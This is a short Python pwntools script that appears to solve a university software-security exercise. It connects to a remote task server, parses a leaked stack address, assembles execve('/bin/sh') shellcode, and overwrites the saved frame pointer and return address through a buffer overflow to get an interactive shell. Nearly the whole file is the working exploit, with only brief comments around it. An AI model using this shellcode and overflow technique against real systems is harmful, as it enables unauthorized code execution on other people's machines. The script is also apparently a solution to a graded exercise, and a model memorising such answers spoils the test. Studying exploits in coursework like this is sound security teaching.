#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
conn = pwn.remote('tasks.ws24.softsec.rub.de', 32942)

# spawn binary and a gdb instance for debugging
# this way we can use pwntools to transfer bytes 
"""
conn = pwn.process('./vuln')
pwn.gdb.attach(conn)
"""

# shellcode from the slides
shellcode = pwn.asm('''
    mov rsp, rbp; # we need to move the rsp as well sothat stack well build
    xor rax, rax;
    mov al, 59;
    lea rdi, [rip + sh];
    xor rsi, rsi;
    xor rdx, rdx;
    syscall;
sh:
    .string "/bin/sh"
    nop
''')

# print shellcode to make sure that 32 byte (or add padding)
"""
print(f'shellcode: {shellcode.hex()}')
"""

conn.recvuntil(b'Hello! My name is 0x')
address = conn.recvuntil(b'!\nWhat is your name?', drop=True)
address_RIP = int(address.decode('utf-8'), 16)
# we need top of buffer, but get middle of big 32 byte buffer (two 16 byte buffers in C)
address_RIP -= 16
# we set RBP = RIP, because we have no data on stack for our shellcode
address_RBP = address_RIP
payload = shellcode + pwn.p64(address_RBP) + pwn.p64(address_RIP)
print(payload.hex())
# send shellcode
conn.sendline(payload)
# start interactive session (we have a shell now)
conn.interactive()
